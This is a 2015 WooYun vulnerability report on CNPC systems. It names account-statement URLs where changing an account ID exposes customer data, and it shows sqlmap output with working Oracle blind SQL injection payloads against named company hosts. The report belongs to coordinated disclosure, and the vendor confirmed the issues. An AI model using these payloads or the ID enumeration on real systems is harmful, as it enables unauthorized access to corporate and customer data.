{"id": 69300, "wybug_id": "wooyun-2015-0139226", "wybug_title": "中国石油多个系统多个漏洞(SQL注入&amp;越权)", "wybug_corp": "中国石油天然气集团公司", "wybug_author": "路人甲", "wybug_date": "2015-09-06 11:21", "wybug_open_date": "2015-10-21 14:52", "wybug_type": "网络未授权访问", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["内部敏感信息泄漏"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向公众公开  简要描述： 漏点已马赛克 详细说明：  1.出现漏洞的是http://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/ebank/accountmanage/foreign/Khdzd.jsp?tsStart=2015-05-01&tsEnd=2015-05-28&lAccountID=21399&lAccountIDCode=010100000742&lCurrencyID=2这个链接 http://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/ebank/accountmanage/foreign/Khdzd.jsp?tsStart=2015-05-01&tsEnd=2015-05-28&lAccountID=21401&lAccountIDCode=010100000742&lCurrencyID=2遍历AccountID即可看AccountID这个参数，有几万条信息了\n\n\n\n   漏洞证明：  2.我又发现居然还有这么两处http://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/ebank/accountmanage/Khdzd_d.jsp?tsStart=2015-03-25&tsEnd=2015-03-25&lAccountID=22723&lAccountIDCode=010100002486&strPayerClientName=&dAmountMin=0.0&dAmountMax=0.0http://econline.cpf.com.cn:8080/NASApp/iTreasury-ebank/ebank/accountmanage/Khdzd_d_new.jsp?tsStart=2014-12-22&tsEnd=2014-12-22&lAccountID=22930&lAccountIDCode=020100002629&strPayerClientName=%E5%A4%A7%E5%BA%86%E6%B2%B9%E7%94%B0%E7%9F%BF%E5%8C%BA%E6%9C%8D%E5%8A%A1%E4%BA%8B%E4%B8%9A%E9%83%A8%E5%A4%96%E5%9B%B4%E7%89%A9%E4%B8%9A%E7%AE%A1%E7%90%86%E5%85%AC%E5%8F%B8&dAmountMin=0.0&dAmountMax=0.0泄漏的信息也更多了啊，同样通过遍历accountID可以下载客户的一些信息\n\n\n\n3.注入链接http://oilinfo.cnpc.com.cn/cnpcstockinfo/tongji/ajaxCount.jsp?url=http://oilinfo.cnpc.com.cn/ypxx/ypzs/201505/b7e3a28737834f6d9ca78ed3d14b1a53.shtmlsql语句都直接显示出来，也是醉了\n\n直接上神器sqlmap\n</cURI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] sqlmap identified the following injection points with a total of 55 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://oilinfo.cnpc.com.cn:80/cnpcstockinfo/tongji/ajaxCount.jsp?url=http://oilinfo.cnpc.com.cn/ypxx/ypzs/201505/b7e3a28737834f6d9ca78ed3d14b1a53' AND 9194=9194 AND 'jLRT'='jLRT.shtml    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (comment)    Payload: http://oilinfo.cnpc.com.cn:80/cnpcstockinfo/tongji/ajaxCount.jsp?url=http://oilinfo.cnpc.com.cn/ypxx/ypzs/201505/b7e3a28737834f6d9ca78ed3d14b1a53' AND 5112=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(111)||CHR(110)||CHR(119),5)--.shtml---[00:37:53] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracleode>我能说主站也有吗http://www.cnpc.com.cn/cnpcstockinfo/tongji/ajaxCount.jsp?url=http://www.cnpc.com.cn/ypxx/nyzc/201505/f2b5cf0c3a8e401cbd8a59782a96b1c6.shtml\n\n\n\n\n\n\n\n\n\n数据库名字frontapp<code>sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: URIParameter: #1*    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: http://oilinfo.cnpc.com.cn:80/cnpcstockinfo/tongji/ajaxCount.jsp?url=http://oilinfo.cnpc.com.cn/ypxx/ypzs/201505/b7e3a28737834f6d9ca78ed3d14b1a53' AND 9194=9194 AND 'jLRT'='jLRT.shtml    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (comment)    Payload: http://oilinfo.cnpc.com.cn:80/cnpcstockinfo/tongji/ajaxCount.jsp?url=http://oilinfo.cnpc.com.cn/ypxx/ypzs/201505/b7e3a28737834f6d9ca78ed3d14b1a53' AND 5112=DBMS_PIPE.RECEIVE_MESSAGE(CHR(118)||CHR(111)||CHR(110)||CHR(119),5)--.shtml---[00:39:38] [INFO] the back-end DBMS is Oracleweb application technology: JSPback-end DBMS: Oracle[00:39:38] [INFO] fetching current database[00:39:38] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval[00:39:38] [INFO] retrieved: [00:39:41] [WARNING] reflective value(s) found and filtering outFRONTAPP[00:41:16] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSescurrent schema (equivalent to database on Oracle):    'FRONTAPP'[00:41:16] [INFO] fetched data logged to text files under '/usr/share/sqlmap/output/oilinfo.cnpc.com.cn'\n   修复方案：     版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-09-06 14:50 厂商回复： 非常感谢您的报告，问题已着手处理. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}